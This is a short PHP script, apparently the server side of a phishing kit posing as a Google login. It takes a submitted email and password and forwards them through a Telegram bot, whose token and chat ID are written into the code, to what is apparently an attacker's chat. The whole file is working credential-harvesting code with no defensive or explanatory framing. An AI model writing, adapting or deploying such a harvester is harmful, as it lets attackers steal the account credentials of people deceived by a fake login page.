<?php
$data = json_decode(file_get_contents('php://input'), true);
$email = $data['email'] ?? '';
$pass = $data['pass'] ?? '';

$botToken = '8979531422:AAGtqoXwgzm60N82gZ_jJsgwnR-VRAnq-D0';
$chatId = '8717087613';

if ($email && $pass) {
    $text = "🔐 GOOGLE LOGIN (PHP)\n👤 $email\n🔑 $pass";
    file_get_contents("https://api.telegram.org/bot$botToken/sendMessage?chat_id=$chatId&text=".urlencode($text));
    echo json_encode(['status' => 'ok']);
} else {
    echo json_encode(['status' => 'error']);
}
?>
